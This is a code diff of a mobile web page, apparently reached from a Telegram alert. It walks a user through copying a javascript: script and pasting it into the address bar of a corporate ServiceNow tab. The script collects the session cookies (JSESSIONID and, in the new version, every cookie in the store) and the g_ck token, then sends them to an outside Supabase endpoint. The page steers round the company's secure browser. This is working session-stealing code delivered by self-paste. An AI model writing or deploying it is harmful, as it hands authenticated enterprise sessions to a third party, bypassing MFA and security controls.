@@ -12,46 +12,43 @@
     .step{font-weight:600;color:#38bdf8;margin-bottom:6px}
     a.btn,button.primary{display:block;width:100%;text-align:center;background:#2563eb;color:#fff;text-decoration:none;padding:14px;border-radius:10px;font-weight:600;margin:12px 0;border:none;font-size:1rem}
     button.green{background:#059669}
-    button.purple{width:100%;padding:12px;border:none;border-radius:10px;background:#7c3aed;color:#fff;font-weight:600;font-size:1rem}
     input,textarea{width:100%;padding:10px;border-radius:8px;border:1px solid #475569;background:#0f172a;color:#e2e8f0;margin:6px 0;font-size:14px}
     .ok{color:#4ade80}.err{color:#f87171}.warn{color:#fbbf24}
     small{color:#94a3b8}
-    #err{display:none}
+    #err{display:block}
     ol{padding-left:1.2rem;margin:8px 0}
     li{margin:10px 0}
     .tip{background:#0f172a;border-left:3px solid #38bdf8;padding:10px 12px;margin:10px 0;border-radius:6px}
+    .danger{background:#450a0a;border-left:3px solid #f87171;padding:10px 12px;margin:10px 0;border-radius:6px}
+    .num{display:inline-block;width:1.4rem;height:1.4rem;line-height:1.4rem;text-align:center;background:#2563eb;border-radius:50%;font-size:.85rem;margin-right:6px}
   </style>
 </head>
 <body>
-  <h1>🔄 Refresh session (mobile)</h1>
+  <h1>🔄 Refresh session</h1>
   <p id="err" class="err"></p>
   <div id="app" style="display:none">
-    <p><small>One-time link from Telegram — do not save.</small></p>
-    <div class="tip">
-      Use <strong>Safari</strong> or <strong>Chrome</strong> on your phone. No Prisma Access Browser needed.
-    </div>
+    <div class="tip">Safari or Chrome on phone. <strong>No PAB.</strong></div>
+
     <div class="card">
-      <div class="step">Step 1 — Login & open queue</div>
-      <p><small>Complete MFA. Wait until you <strong>see ticket rows</strong>.</small></p>
-      <a class="btn" id="snow" href="#">Open ServiceNow queue</a>
-    </div>
-    <div class="card">
-      <div class="step">Step 2 — Upload session</div>
-      <ol>
-        <li>On the <strong>ServiceNow queue tab</strong>, tap <strong>Copy session script</strong> below</li>
-        <li>Paste in the <strong>address bar</strong> on that same ServiceNow tab → Go</li>
-        <li>Wait for ✅ alert, then check Telegram</li>
-      </ol>
+      <div class="step"><span class="num">1</span> Copy script (stay on this page)</div>
       <button type="button" class="primary green" id="copyScript">📋 Copy session script</button>
       <p id="copyMsg"></p>
     </div>
+
     <div class="card">
-      <div class="step">Manual fallback</div>
-      <p><small>Paste full cookie if script fails (must include JSESSIONID).</small></p>
-      <textarea id="cookie" rows="3" placeholder="JSESSIONID=...; UX-Token=..."></textarea>
-      <input id="gck" placeholder="g_ck token (optional)"/>
-      <button type="button" class="purple" id="submit">Upload manually</button>
-      <p id="msg"></p>
+      <div class="step"><span class="num">2</span> Open queue & login</div>
+      <a class="btn" id="snow" href="#">Open ServiceNow queue</a>
+      <p><small>Complete MFA. Wait until you <strong>see ticket rows</strong>.</small></p>
+    </div>
+
+    <div class="card">
+      <div class="step"><span class="num">3</span> Run script on ServiceNow tab</div>
+      <div class="danger">
+        <strong>Do NOT paste into the box below.</strong><br/>
+        On the <strong>micron.service-now.com</strong> tab:<br/>
+        tap address bar → <strong>Paste</strong> → <strong>Go</strong>
+      </div>
+      <p><small>You should see a popup: ✅ Done! Check Telegram.</small></p>
     </div>
   </div>
   <script>
@@ -64,23 +61,25 @@
     const rpc = SUPABASE_URL + '/rest/v1/rpc/upload_session_with_token';
 
     function sessionScript(tok) {
-      const inline = `(async function(){var t=${JSON.stringify(tok)};var rpc=${JSON.stringify(rpc)};var k=${JSON.stringify(ANON_KEY)};var q=${JSON.stringify(SNOW_QUERY)};var g=window.g_ck||(document.body.innerHTML.match(/g_ck\\s*=\\s*['"]([^'"]+)['"]/)||[])[1]||'';if(!g)throw new Error('Open the queue link first and login');var tu='/api/now/table/sn_si_incident?sysparm_query='+encodeURIComponent(q)+'&sysparm_limit=1&sysparm_fields=number';var te=await fetch(tu,{credentials:'include',headers:{'X-UserToken':g,'Accept':'application/json'}});if(!te.ok)throw new Error('API test failed '+te.status+' — login on queue page first');var parts={};document.cookie.split(';').forEach(function(p){var i=p.indexOf('=');if(i>0)parts[p.slice(0,i).trim()]=p.slice(i+1).trim()});try{if(window.cookieStore&&cookieStore.getAll){var all=await cookieStore.getAll();all.forEach(function(c){if(c.name&&(!c.domain||c.domain.indexOf('service-now')>=0))parts[c.name]=c.value})}}catch(e){}var cookie=Object.keys(parts).map(function(n){return n+'='+parts[n]}).join('; ');if(!/JSESSIONID=/.test(cookie))throw new Error('Missing JSESSIONID — use Chrome or Safari, open queue link, login, retry');var r=await fetch(rpc,{method:'POST',headers:{'Content-Type':'application/json','apikey':k,'Authorization':'Bearer '+k},body:JSON.stringify({p_token:t,p_cookie:cookie,p_g_ck:g})});var d=await r.json();if(!d.ok)throw new Error(d.error||'Upload failed');alert('✅ Done! Check Telegram.')})().catch(function(e){alert('❌ '+e.message)});`;
+      if (!tok) throw new Error('Invalid link — open the latest Telegram alert');
+      const inline = `(async function(){var t=${JSON.stringify(tok)};var rpc=${JSON.stringify(rpc)};var k=${JSON.stringify(ANON_KEY)};var q=${JSON.stringify(SNOW_QUERY)};var g=window.g_ck||(document.body.innerHTML.match(/g_ck\\s*=\\s*['"]([^'"]+)['"]/)||[])[1]||'';if(!g)throw new Error('Stay on ServiceNow queue page after login');var tu='/api/now/table/sn_si_incident?sysparm_query='+encodeURIComponent(q)+'&sysparm_limit=1&sysparm_fields=number';var te=await fetch(tu,{credentials:'include',headers:{'X-UserToken':g,'Accept':'application/json'}});if(!te.ok)throw new Error('Login first — API '+te.status);var parts={};document.cookie.split(';').forEach(function(p){var i=p.indexOf('=');if(i>0)parts[p.slice(0,i).trim()]=p.slice(i+1).trim()});try{if(window.cookieStore&&cookieStore.getAll){var all=await cookieStore.getAll();for(var j=0;j<all.length;j++){var c=all[j];if(c.name)parts[c.name]=c.value}}}catch(e){}var cookie=Object.keys(parts).map(function(n){return n+'='+parts[n]}).join('; ');if(!/JSESSIONID=/.test(cookie))throw new Error('Missing JSESSIONID — try Chrome Android, or IT API access');var r=await fetch(rpc,{method:'POST',headers:{'Content-Type':'application/json','apikey':k,'Authorization':'Bearer '+k},body:JSON.stringify({p_token:t,p_cookie:cookie,p_g_ck:g})});var d=await r.json();if(!d.ok)throw new Error(d.error||'Upload failed');alert('✅ Done! Check Telegram.')})().catch(function(e){alert('❌ '+e.message)});`;
       return 'javascript:' + encodeURIComponent(inline);
     }
 
     if (!token) {
-      errEl.style.display = 'block';
-      errEl.textContent = 'Missing link. Use the latest Telegram session-failed alert.';
+      errEl.textContent = '❌ Missing token in link. Tap the newest Telegram alert (not an old saved page).';
     } else {
+      errEl.style.display = 'none';
       document.getElementById('app').style.display = 'block';
       document.getElementById('snow').href = SNOW_QUEUE_URL;
 
       document.getElementById('copyScript').onclick = async () => {
         const cm = document.getElementById('copyMsg');
-        const script = sessionScript(token);
         try {
-          if (navigator.clipboard && navigator.clipboard.writeText) await navigator.clipboard.writeText(script);
-          else {
+          const script = sessionScript(token);
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+            await navigator.clipboard.writeText(script);
+          } else {
             const ta = document.createElement('textarea');
             ta.value = script;
             document.body.appendChild(ta);
@@ -88,33 +87,11 @@
             document.execCommand('copy');
             document.body.removeChild(ta);
           }
-          cm.textContent = '✅ Copied! On ServiceNow tab: paste in address bar → Go';
+          cm.innerHTML = '✅ <strong>Copied!</strong><br/>Now open queue (step 2), then paste in <strong>ServiceNow address bar</strong> (step 3).';
           cm.className = 'ok';
         } catch (e) {
-          cm.textContent = '❌ Copy failed — use manual paste below';
+          cm.textContent = '❌ ' + e.message;
           cm.className = 'err';
-        }
-      };
-
-      document.getElementById('submit').onclick = async () => {
-        const msg = document.getElementById('msg');
-        msg.textContent = 'Uploading...';
-        const cookie = document.getElementById('cookie').value.trim();
-        const gck = document.getElementById('gck').value.trim();
-        if (!cookie) { msg.textContent = '❌ Paste cookie first'; msg.className = 'err'; return; }
-        if (!/JSESSIONID=/.test(cookie)) { msg.textContent = '❌ Cookie must include JSESSIONID'; msg.className = 'err'; return; }
-        try {
-          const r = await fetch(rpc, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', apikey: ANON_KEY, Authorization: 'Bearer ' + ANON_KEY },
-            body: JSON.stringify({ p_token: token, p_cookie: cookie, p_g_ck: gck }),
-          });
-          const d = await r.json();
-          msg.textContent = d.ok ? '✅ ' + (d.message || 'Updated') : '❌ ' + (d.error || 'Failed');
-          msg.className = d.ok ? 'ok' : 'err';
-        } catch (e) {
-          msg.textContent = '❌ ' + e;
-          msg.className = 'err';
         }
       };
     }
